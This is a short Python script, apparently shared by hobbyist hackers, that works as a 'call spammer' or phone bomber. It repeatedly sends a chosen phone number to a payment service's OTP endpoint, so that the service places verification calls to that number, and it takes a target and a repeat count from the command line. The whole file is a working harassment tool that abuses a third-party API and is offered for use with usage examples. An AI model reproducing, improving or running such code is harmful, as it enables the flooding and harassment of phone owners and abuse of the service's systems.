#!/usr/bin/python
#-*-coding:utf-8-*-
# Call Spammer
# Coded By Deray
# Github : https://github.com/LOoLzeC
# Instagram : reyy05_
####################
__banner__="""
********************************************
* Bom telp by Joe
* Coded By : JoeTampans
* Team : EldersC0de Family
* Github : https://github.com/joesimorangkir
********************************************
"""
import sys,requests
def callpam():
	print __banner__
	phone=sys.argv[1]
	ulang=sys.argv[2]
	numb=int(ulang)
	param = {'msisdn':phone,'accept':'call'}
	count = 0
	while (numb > count):
		r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
		if "otp_attempt_left" in r.text:
			print "[%s] send succes"%count
		else:
			print "[%s] send failed"%count
		count=count+1
if __name__ == "__main__":
	if len(sys.argv) !=3:
		print __banner__
		print "[-] Ussage: python "+sys.argv[0]+" number count"
		print "[+] Example : python "+sys.argv[0]+" 0895353xxx 10"
		sys.exit
	else:
		callpam()
